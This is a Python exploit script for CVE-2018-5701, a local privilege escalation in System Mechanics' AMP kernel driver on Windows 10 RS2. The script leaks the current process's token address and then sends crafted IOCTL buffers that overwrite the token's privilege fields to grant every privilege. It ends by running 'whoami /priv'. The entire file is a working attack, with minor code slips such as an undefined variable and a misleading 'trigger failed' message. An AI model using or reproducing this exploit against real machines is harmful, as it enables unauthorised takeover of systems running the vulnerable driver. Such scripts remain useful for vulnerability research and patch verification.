#Purpose: System Mechanics Arbitrary Write - Local Privilege Escalation (LPE)
#Platform: Windows 10 RS2
#Written By: Eric Van Zutphen
#CVE: CVE-2018-5701

import sys
import subprocess, os, struct
from ctypes import *
from ctypes.wintypes import *
import os

# Functions proxy
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32
OpenProcessToken = advapi32.OpenProcessToken

# Windows Common Data Types
NTSTATUS = DWORD
PHANDLE = POINTER(HANDLE)
PVOID = LPVOID = ULONG_PTR = c_void_p

# Constants
ObjectTypeInformation = 2
SystemExtendedHandleInformation = 64
STATUS_SUCCESS = 0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_INVALID_HANDLE = 0xC0000008

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]

class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

# NTSTATUS WINAPI NtQuerySystemInformation(
#   _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
#   _Inout_   PVOID                    SystemInformation,
#   _In_      ULONG                    SystemInformationLength,
#   _Out_opt_ PULONG                   ReturnLength
# );
ntdll.NtQuerySystemInformation.argtypes = [DWORD, POINTER(SYSTEM_HANDLE_INFORMATION_EX), ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS

# BOOL OpenProcessToken(
#  _In_opt_     HANDLE  ProcessHandle,
#  _In_         DWORD   DesiredAccess,
#  _Out_opt_    PHANDLE TokenHandle
#  );
advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype  = BOOL

def debug_print(message):
    print(message)

    # void WINAPI OutputDebugString(
    #   _In_opt_ LPCTSTR lpOutputString
    # );

    kernel32.OutputDebugStringA(message + "\n")

def banner():
    logo = """
System Mechanics Arbitrary Write Exploit
Written By: Eric Van Zutphen
Platform: Windows 10 Red Stone 2
CVE: CVE-2018-5701
    """
    return logo

def get_device_handle(device):
    open_existing = 0x3
    generic_read = 0x80000000
    generic_write = 0x40000000

    # HANDLE WINAPI CreateFile(
    #   _In_     LPCTSTR               lpFileName,
    #   _In_     DWORD                 dwDesiredAccess,
    #   _In_     DWORD                 dwShareMode,
    #   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    #   _In_     DWORD                 dwCreationDisposition,
    #   _In_     DWORD                 dwFlagsAndAttributes,
    #   _In_opt_ HANDLE                hTemplateFile
    # );

    # get the device handle
    handle = kernel32.CreateFileA(device,
                                  generic_read | generic_write,
                                  None,
                                  None,
                                  open_existing,
                                  None,
                                  None)

    if not handle:
        debug_print("\t[-] Unable to get device handle")
        sys.exit(-1)
    return handle

def close_handle(handle):
    # BOOL WINAPI CloseHandle(
    #   _In_ HANDLE hObject
    # );

    # close the device handle
    return kernel32.CloseHandle(handle)

def leak_handles():
    system_handle_info = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD(sizeof(system_handle_info))
    while True:
        query = ntdll.NtQuerySystemInformation(SystemExtendedHandleInformation, byref(system_handle_info) ,size,byref(size))
        if query == STATUS_SUCCESS:
            break
        elif query == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(system_handle_info, size.value)
        else:
            raise Exception("NtQuerySystemInformation", hex(result))
    p_handles = cast(
    system_handle_info.Handles,
    POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * system_handle_info.NumberOfHandles)
    )
    for handle in p_handles.contents:
        yield handle.UniqueProcessId, handle.HandleValue, handle.Object

def get_handle_information(process_id, handle_value):
    for pid, handle, obj in leak_handles():
        if pid == process_id and handle == handle_value:
            debug_print(
                "[+] Token Address: {1}".format(
                    handle, hex(obj).rstrip("L")
                )
            )

            return obj

if __name__ == "__main__":
    # show the banner
    debug_print(banner())
    # constant declaration
    bytes_returned = c_ulong()
    ioctl_arbitrary_overwrite = 0x00226003
    device_name = "\\\\.\\AMP"
    # now get the handle to the vulnerable driver
    debug_print("[+] Opening vulnerable device: {0}".format(device_name))
    device_handle = get_device_handle(device_name)
    debug_print("[+] Got a Handle on Vulnerable Device: {0} ".format(device_handle))
    # BOOL WINAPI DeviceIoControl(
    #   _In_        HANDLE       hDevice,
    #   _In_        DWORD        dwIoControlCode,
    #   _In_opt_    LPVOID       lpInBuffer,
    #   _In_        DWORD        nInBufferSize,
    #   _Out_opt_   LPVOID       lpOutBuffer,
    #   _In_        DWORD        nOutBufferSize,
    #   _Out_opt_   LPDWORD      lpBytesReturned,
    #   _Inout_opt_ LPOVERLAPPED lpOverlapped
    # );
    # send the control code with buffer to the vulnerable driver
    process_handle = HANDLE(kernel32.GetCurrentProcess())
    process_id = kernel32.GetCurrentProcessId()
    debug_print("[+] Current PID: {0}".format(str(process_id)))
    handle = HANDLE()
    return_value = OpenProcessToken(process_handle, 0x8, byref(handle))
    if return_value == 1:
        debug_print("[*] Successfully Grabbed Handle: " + str(handle.value) + " For PID: " + str(process_id))
    else:
        debug_print("[+] Could Not Grab Handle!")
    token = get_handle_information(process_id, handle.value)
    debug_print("[+] Sending Exploit to Vulnerable IOCTL: {0}".format(hex(ioctl_arbitrary_overwrite)))

    success = DWORD()
    ioctl_read = ''.join([struct.pack('<Q', x) for x in [0, 0, 0, 0]])

    #Prepare Present Payload
    opcode = struct.pack("<Q", 0x8)
    buffer1 = struct.pack("<Q", id(ioctl_read) + 32)
    write = struct.pack("<Q", token + 0x40+1)
    present = bytes(''.join([opcode,buffer1,write]))

    # Prepare Enabled Payload
    opcode = struct.pack("<Q", 0x8)
    buffer1 = struct.pack("<Q", id(ioctl_read) + 32)
    write = struct.pack("<Q", token + 0x48+1)
    enabled = bytes(''.join([opcode,buffer1,write]))

    # Prepare EnabledByDefault Payload
    opcode = struct.pack("<Q", 0x8)
    buffer1 = struct.pack("<Q", id(ioctl_read) + 32)
    write = struct.pack("<Q", token + 0x50+1)
    default = bytes(''.join([opcode,buffer1,write]))

    debug_print("[+] Overwriting Token Privileges: Present")
    success = kernel32.DeviceIoControl(device_handle, ioctl_arbitrary_overwrite,present,len(present), None, 0, byref(bytes_returned), None)
    close_handle(success)
    debug_print("[+] Overwriting Token Privileges: Enabled")
    success = kernel32.DeviceIoControl(device_handle, ioctl_arbitrary_overwrite,enabled,len(enabled), None, 0, byref(bytes_returned), None)
    close_handle(success)
    print("[+] Overwriting Token Privileges: EnabledByDefault")
    success = kernel32.DeviceIoControl(device_handle, ioctl_arbitrary_overwrite,default,len(default), None, 0, byref(bytes_returned), None)
    debug_print("[+] Closing the Device Handle")
    if not close_handle(device_handle):
        debug_print("\t[-] Unable to close device handle")
    debug_print("[+] Arbitrary Memory Overwrite trigger failed...")
    os.system('cmd.exe /c whoami /priv')
